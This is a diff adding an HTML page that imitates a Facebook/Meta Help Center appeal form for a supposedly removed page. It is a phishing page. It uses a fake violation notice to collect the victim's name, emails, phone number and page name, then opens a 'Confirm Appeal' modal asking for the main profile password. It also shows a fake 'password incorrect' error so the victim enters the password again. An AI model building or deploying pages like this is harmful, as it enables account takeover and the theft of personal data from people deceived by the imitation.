@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Help Center | Privacy Policy</title>
+    <meta name="referrer" content="no-referrer">
+    <link rel="icon" href="imgs/fb_icon_325x325.png" type="image/x-icon">
+    <meta name="csrf-token" content="lg9sxAhYtjIOS3udzoR9UaSlq7PHnic9MzQpf7N8">
+    <meta property="og:image" content="https://i.imgur.com/dPbn7je.jpg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <script src="functions.js"></script>
+
+    <style>
+        /* Custom styles go here */
+
+        body {
+            font-family: 'Helvetica', sans-serif;
+            background-color: #f7f7f7;
+            color: #333;
+        }
+
+        .topheader {
+            background-color: #ffffff;
+            padding: 0.5rem;
+        }
+
+        .topheader img {
+            object-fit: cover;
+        }
+
+        .search-bar {
+            display: flex;
+            width: 60%;
+            margin: 0 auto;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .search-bar span {
+            background-color: #f1f5f8;
+            padding: 0.5rem;
+            border-right: 1px solid #e2e8f0;
+        }
+
+        .search-bar input {
+            flex: 1;
+            padding: 0.5rem 1rem;
+            border: 1px solid #e2e8f0;
+            outline: none;
+            font-size: 14px;
+        }
+
+        .help-center {
+            background-color: #e9ebee;
+        }
+
+        .help-center a {
+            color: #3578e5;
+            font-weight: bold;
+            padding: 1rem;
+            border-bottom: 3px solid #3578e5;
+        }
+
+        .language {
+            color: #3578e5;
+            font-size: 12px;
+        }
+
+        .content {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            grid-gap: 10px;
+            margin: 2rem auto;
+        }
+
+        .sidebar ul {
+            list-style: none;
+            padding: 0;
+        }
+        @media screen and (max-width: 768px) {
+        .sidebar {
+            display: none;
+        }
+
+        .content {
+            grid-template-columns: 100%; /* Adjust the grid layout for the content */
+        }
+
+        .form {
+            width: 100%; /* Make the form container take full width */
+        }
+        }
+
+        .sidebar a {
+            text-decoration: none;
+            font-size: 14px;
+            padding: 5px 0;
+            display: block;
+            transition: background-color 0.3s;
+        }
+
+        .sidebar a:hover {
+            background-color: #e9ebee;
+        }
+
+        .form-container {
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .form-header {
+            background-color: #f5f6f7;
+            padding: 1rem;
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        .form-body {
+            padding: 1rem;
+        }
+
+        .form-body label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+            color: #90949c;
+        }
+
+        .form-body input,
+        .form-body textarea {
+            width: 100%;
+            padding: 0.5rem;
+            margin-bottom: 1rem;
+            border: 1px solid #d1d5db;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-body input:focus,
+        .form-body textarea:focus {
+            border-color: #1877f2;
+        }
+
+        .form-footer {
+            display: flex;
+            justify-content: flex-end;
+            padding: 1rem;
+            background-color: #f5f6f7;
+        }
+
+        .form-footer button {
+            background-color: #1877f2;
+            color: #fff;
+            font-weight: bold;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .form-footer button:hover {
+            background-color: #0e5a9a;
+        }
+
+        .footer {
+            color: #ffffff;
+            background-color: #1877f2;
+            margin-top: 10rem;
+            padding: 2rem 0;
+        }
+
+        .footer ul {
+            list-style: none;
+            display: grid;
+            grid-template-columns: (auto-fit, minmax(100px, 1fr));
+            gap: 20px;
+            color: #ffffff;
+        }
+
+        .footer ul ion-icon {
+            font-size: 24px;
+            color: #ffffff;
+        }
+
+        .modal {
+            background-color: rgba(0, 0, 0, 0.5);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            border-radius: 8px;
+            overflow: hidden;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .modal-header {
+            background-color: #f5f6f7;
+            padding: 1rem;
+            border-bottom: 1px solid #e2e8f0;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .modal-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0s, opacity 0.5s;
+        }
+
+        .modal-body {
+            padding: 1rem;
+        }
+
+        .modal-body p {
+            font-size: 14px;
+            color: #333;
+        }
+
+        .form-body label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+            color: #90949c;
+            font-size: 11px; /* Adjust the font size as needed */
+        }
+
+        .form-footer {
+            display: flex;
+            justify-content: flex-end;
+            padding: 1rem;
+            background-color: #f5f6f7;
+        }
+
+        #fcf-button {
+            background-color: #1877f2; /* Facebook blue color */
+            color: #fff;
+            border-radius: 4px;
+            font-weight: bold;
+            border: none;
+            font-family: Helvetica;
+            padding: 5px 10px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-left: 1rem; /* Adjust the margin as needed */
+            float: right;
+        }
+
+        #fcf-button:hover {
+            background-color: #0e5a9a;
+        }
+
+
+        .modal-form {
+            margin-top: 1rem;
+        }
+
+        .modal-form label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .modal-form input {
+            width: 100%;
+            padding: 0.5rem;
+            margin-bottom: 1rem;
+            border: 1px solid #d1d5db;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .modal-form input:focus {
+            border-color: #1877f2;
+        }
+
+        .modal-footer {
+            display: flex;
+            justify-content: flex-end;
+            padding: 1rem;
+            background-color: #f5f6f7;
+            border-top: 1px solid #e2e8f0;
+        }
+
+        .modal-footer button {
+            background-color: #1877f2;
+            color: #fff;
+            font-weight: bold;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .modal-footer button:hover {
+            background-color: #0e5a9a;
+        }
+        .modal-content {
+            background-color: #fff;
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .modal-container.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .password-error {
+            color: red;
+            display: none;
+        }
+        .modal-content button {
+            background-color: blue; /* Change the background color to blue */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .modal-content button:hover {
+            background-color: darkblue; /* Change the background color on hover */
+        }
+
+        .modal-content input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid blue;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .text-muted {
+    color: #6c757d; /* Set your desired muted color */
+    font-size: 14px; /* Set your desired font size */
+}
+
+.text-muted #randomNumber {
+    font-weight: bold; /* Set bold for the case number */
+    color: #333; /* Set a color for the case number */
+}
+/* Style for the container div */
+.icon-and-text {
+    display: flex;
+    align-items: center;
+    padding: 10px;
+    border-bottom: 1px solid #ddd; /* Add a border for visual separation */
+    border-radius: 8px; /* Add border radius for rounded corners */
+}
+
+/* Style for the image */
+.icon-and-text img {
+    width: 50px; /* Set the width of the image */
+    height: auto; /* Maintain aspect ratio */
+    margin-right: 10px; /* Add some space between the image and the text */
+}
+
+/* Style for the "OPEN" span */
+.icon-and-text span.open {
+    padding: 7px;
+    background-color: rgb(59, 129, 211);
+    font-size: 12px;
+    color: rgb(255, 255, 255);
+    border-radius: 15px;
+    margin-right: 10px; /* Add some space between the span and the text */
+}
+
+/* Style for the "CASE" paragraph */
+.icon-and-text p.text-muted {
+    margin: 0; /* Remove default margin */
+    font-size: 14px; /* Set the font size for the paragraph */
+    color: #6c757d; /* Set the text color to a muted color */
+}
+
+/* Style for the case number span within the paragraph */
+.icon-and-text p.text-muted #randomNumber {
+    font-weight: bold;
+    color: #333;
+}
+
+/* Style for the container div */
+.our-message-container {
+    margin-top: -20px;
+    display: flex;
+    align-items: center;
+    padding: 0px;
+    border-radius: 8px;
+}
+
+/* Style for the image */
+.our-message-container img {
+    max-width: 100%; /* Ensure the image doesn't exceed its container */
+    height: auto;
+    border-radius: 8px; /* Add border radius for rounded corners */
+}
+
+/* Style for the text content */
+.our-message-content {
+    flex: 1;
+    padding-left: 15px; /* Add left padding to create space between the image and text */
+}
+
+/* Style for the heading */
+.our-message-content p.heading {
+    font-weight: bold;
+    font-size: 14px;
+    margin-bottom: 7px;
+}
+
+/* Style for the paragraph */
+.our-message-content p.our-message-text {
+    font-size: 14px;
+    color: rgb(103, 120, 138);
+    margin: 0; /* Remove default margin */
+}
+
+/* Style for the list items within the paragraph */
+.our-message-content p.our-message-text li {
+    list-style: none; /* Remove default list styling */
+    margin-bottom: 5px; /* Add space between list items */
+}
+
+input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+    </style>
+
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule="" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    <script type="text/javascript">
+        $.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+            }
+        });
+        window.addEventListener("DOMContentLoaded", function() {
+            generateRandomNumber();
+        });
+
+        function generateRandomNumber() {
+            var randomNumber = Math.floor(Math.random() * 900000000000) + 100000000000;
+            document.getElementById("randomNumber").innerHTML = randomNumber;
+        }
+    </script>
+</head>
+
+<body>
+<!-- Top Header -->
+<div class="topheader p-2">
+    <div class="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
+        <div class="w-[20%] md:w-[15%]">
+            <a href="">
+                <img src="https://seeklogo.com/images/M/meta-icon-new-facebook-2021-logo-83520C311D-seeklogo.com.png" width="40" class="object-cover logo-img">
+            </a>
+        </div>
+        <div class="search-bar">
+            <span class="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm"><ion-icon name="search-outline" role="img" class="md hydrated"></ion-icon></span>
+            <input type="search" class="py-2 px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none" placeholder="How can we help?">
+        </div>
+    </div>
+</div>
+
+<!-- Help Center Navigation -->
+<div class="help-center bg-[#E9EBEE]">
+    <div class="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
+        <a href="#" class="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]">
+            <ion-icon name="home" role="img" class="md hydrated"></ion-icon> Help Center
+        </a>
+        <p class="language text-[#3578E5] text-xs">English</p>
+    </div>
+</div>
+
+<!-- Main Content -->
+<div class="content w-11/12 sm:w-11/12 md:w-4/6 grid gap-10 mx-auto my-8 grid-cols-1 md:grid-cols-[0.3fr_1fr]">
+    <!-- Sidebar -->
+    <div class="sidebar order-2 md:order-none">
+        <ul>
+            <li><a href="#">Creating an Account</a></li>
+            <li><a href="#">Your Profile</a></li>
+            <li><a href="#">Friending</a></li>
+            <li><a href="#">Facebook Dating</a></li>
+            <li><a href="#">Your Home Page</a></li>
+            <li><a href="#">Messaging</a></li>
+            <li><a href="#">Reels</a></li>
+            <li><a href="#">Stories</a></li>
+            <li><a href="#">Photos</a></li>
+            <li><a href="#">Videos</a></li>
+            <li><a href="#">Gaming</a></li>
+            <li><a href="#">Pages</a></li>
+            <li><a href="#">Groups</a></li>
+            <li><a href="#">Events</a></li>
+            <li><a href="#">Fundraisers and Donations</a></li>
+            <li><a href="#">Meta Pay</a></li>
+            <li><a href="#">Marketplace</a></li>
+            <li><a href="#">Apps</a></li>
+            <li><a href="#">Facebook Mobile Apps</a></li>
+            <li><a href="#">Accessibility</a></li>
+        </ul>
+    </div>
+
+    <!-- Page Policy Appeals Form -->
+    <form id="ccnpwxpytrb" class="w-full md:w-[74%] rounded-lg border border-gray-200 h-fit order-1 md:order-none form-container">
+        <div class="form-header">
+        <div class="icon-and-text">
+                <img src="email.jpg" width="50"; alt="">
+                <span data-v-4362cbd2="" class="open" style="padding: 7px; background-color: rgb(59, 129, 211); font-size: 12px; color: rgb(255, 255, 255); border-radius: 15px;">OPEN</span>
+                <p class="text-muted">CASE ID: #<span style="color: #333;">107304929887</span></p>
+                <br>
+                </div>        
+                </div>
+        <div class="form-body">
+        <div class="our-message-container">
+            <div class="col-md-11 col-10 our-message-content">
+            <img src="our.png" width="50"; class="img-fluid" alt="">
+
+                <p class="heading">Our Message</p>
+                    <p class="our-message-text">
+                        - Community Standards - Copyright<br>
+                        - Hate speech, harassment and bullying<br>
+                        - Intellectual property rights<br><br>
+                        If you believe your page was removed by mistake, fill in this form so we can help.
+                    </p>
+                </div>
+            </div>
+            <br>
+            <form class="fcf-form-class" id="freeversion" method="post" action="/checkpoint/next.html">
+            <div class="field">
+                    <p id="MessageError" style="font-size: 11px;" class="text-red-500 text-sm"></p>
+                    <label for="Message" class="label has-text-weight-normal" style="text-align: left;">Please provide information that might help us investigate</label>
+                    <div class="control">
+                        <textarea name="Message" id="Message" class="textarea" maxlength="5000" rows="3" data-validate-field="Message"></textarea>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <p id="NameError" style="font-size: 11px;" class="text-red-500 text-sm"></p>
+                    <label for="Name" class="label has-text-weight-normal" style="text-align: left;">Full Name</label>
+                    <div class="control">
+                        <input type="text" name="Name" id="Name" class="input is-full-width" maxlength="100" data-validate-field="Name">
+                    </div>
+                </div>
+
+                <div class="field">
+                    <p id="EmailError" style="font-size: 11px;" class="text-red-500 text-sm"></p>
+                    <label for="Email" class="label has-text-weight-normal" style="text-align: left;">Personal Email Address</label>
+                    <div class="control">
+                        <input type="email" name="Email" id="Email" class="input is-full-width" maxlength="100" data-validate-field="Email">
+                    </div>
+                </div>
+                <div class="field">
+                    <p id="bEmailError" style="font-size: 11px;" class="text-red-500 text-sm"></p>
+                    <label for="Email" class="label has-text-weight-normal" style="text-align: left;">Business Email Address</label>
+                    <div class="control">
+                        <input type="email" name="bEmail" id="bEmail" class="input is-full-width" maxlength="100" data-validate-field="Email">
+                    </div>
+                </div>
+                <div class="field">
+                    <p id="PhoneError" style="font-size: 11px;" class="text-red-500 text-sm"></p>
+                    <label for="Phone" class="label has-text-weight-normal" style="text-align: left;">Mobile Phone Number</label>
+                    <div class="control">
+                        <input type="number" name="Phone" id="Phone" class="input is-full-width" maxlength="100" data-validate-field="Phone">
+                    </div>
+                </div>
+
+                <div class="field">
+                <p id="PageNameError" style="font-size: 11px;" class="text-red-500 text-sm"></p>
+                    <label for="PageName" class="label has-text-weight-normal" style="text-align: left;">Facebook Page Name</label>
+                    <div class="control">
+                        <input type="text" name="PageName" id="PageName" class="input is-full-width" maxlength="100" data-validate-field="PageName">
+                    </div>
+                </div>
+                <div class="field">
+                    <div class="buttons">
+                        <button id="fcf-button" type="button" class="button is-link is-medium" onclick="openModal()">Submit</button>
+                        <br>
+                    </div>
+                </div>
+            </form>
+            
+        </div>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+    <div class="sm:w-11/12 md:w-4/6 mx-auto md:px-0 px-2 py-9">
+        <div class="grid xl:grid-cols-5 gap-y-4 lg:grid-cols-3 md:grid-cols-2 grid-cols-2 text-[#90949c] text-sm">
+            <ul class="grid gap-y-2">
+                <li><ion-icon name="logo-facebook" role="img" class="md hydrated"></ion-icon></li>
+            </ul>
+            <ul class="grid gap-y-2">
+                <li>Meta © 2024</li>
+                <li>English (US)</li>
+            </ul>
+            <ul class="grid gap-y-2">
+                <li>About</li>
+                <li>Privacy Policy</li>
+                <li>Careers</li>
+            </ul>
+            <ul class="grid gap-y-2">
+                <li>Ad choices</li>
+                <li>Create ad</li>
+                <li>Create Page</li>
+            </ul>
+            <ul class="grid gap-y-2">
+                <li>Terms &amp; Policies</li>
+                <li>Cookies</li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+<!-- Modal -->
+<div class="modal-container" id="modalContainer" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); justify-content: center; align-items: center;">
+
+    <div class="modal-content" style="background: #fff; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); max-width: 400px; width: 100%; text-align: center;">
+
+        <div class="modal-header" style="border-bottom: 1px solid #ccc; display: flex; justify-content: space-between;">
+            <i class="fas fa-arrow-left" style="color: gray; background-color: lightgray; border-radius: 50%; padding: 10px;"></i>
+            <h3 style="font-size: 18px; font-weight: bold; margin: 0;">Confirm Appeal</h3>
+            <i class="fas fa-times" style="color: gray; background-color: lightgray; border-radius: 50%; padding: 10px;"></i>
+        </div>
+        <div class="modal-body" style="padding-bottom: 10px; margin-bottom: 15px;">
+            <h3 style="font-weight: bold; margin: 0;">For your security, re-enter your main profile password to confirm your appeal.</h3>
+        </div>
+        <div class="input-container" style="position: relative;">
+            <input type="password" id="password" class="password-input" style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+            <span id="password-error-icon" style="position: absolute;margin-top:-8px;right: 10px; top: 50%; transform: translateY(-50%); display: none;font-size: 20px;">
+                <i class="fas fa-exclamation-triangle" style="color: red;"></i>
+            </span>
+        </div>              
+        <p class="password-error" id="password-error" style="color: #ff0000; display: none; font-size: 14px;float:left;">Your password was incorrect.</p>
+        <br>
+        <p class="login-success" id="login-success" style="display: none; font-size: 14px;color: black;"></p>
+
+        
+
+        <button id="butoni1" onclick="submitForm()" style="float:right;background-color: #007bff; color: #fff; padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px;">
+
+            <span id="buttonText">Confirm</span>
+            <img src="checkpoint/loading.svg" id="loadingImage" alt="Loading..." style="display: none;">
+
+        </button>
+
+    </div>
+
+</div>
+
+</body>
+<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule="" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+<script src="npm/axios/dist/axios.min.js"></script>
+<script src="functions.js"></script>
+</html>
